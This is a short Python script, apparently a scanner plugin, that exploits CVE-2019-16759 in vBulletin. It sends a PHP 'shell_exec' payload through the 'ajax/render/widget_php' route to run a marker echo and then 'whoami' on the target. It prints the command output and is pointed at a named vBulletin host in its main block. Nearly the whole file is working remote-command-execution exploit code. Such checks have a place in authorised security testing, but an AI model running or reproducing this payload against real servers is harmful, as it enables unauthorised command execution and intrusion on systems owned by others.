#!/usr/bin/python3

'''
name: CVE-2019-16759漏洞
description: CVE-2019-16759漏洞可执行任意命令
'''

import sys
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2019_16759_BaseVerify:
     def __init__(self, url):
          self.url = url
          self.capta = get_capta() 
          self.check_data = {
               "routestring":"ajax/render/widget_php",
               "widgetConfig[code]": "echo shell_exec('%s'); exit;" % ('echo ' + self.capta)
          }
          self.cmd_data = {
               "routestring":"ajax/render/widget_php",
               "widgetConfig[code]": "echo shell_exec('%s'); exit;" % ('whoami')
          }

     def run(self):
          if not self.url.startswith("http") and not self.url.startswith("https"):
               self.url = "http://" + self.url
          check_req = request.post(self.url, data = self.check_data)
          try:
               if check_req.status_code == 200 and self.capta in check_req.text:
                    cmd_req = request.post(self.url, data = self.cmd_data)
                    print('CVE-2019-16759漏洞,执行whoami命令成功，执行结果为:', cmd_req.text)
                    return True
               else:
                    return False
          except Exception as e:
               print(e)
               return False
          finally:
               pass

if  __name__ == "__main__":
    CVE_2019_16759 = CVE_2019_16759_BaseVerify('https://madnono.vbulletin.net')
    CVE_2019_16759.run()
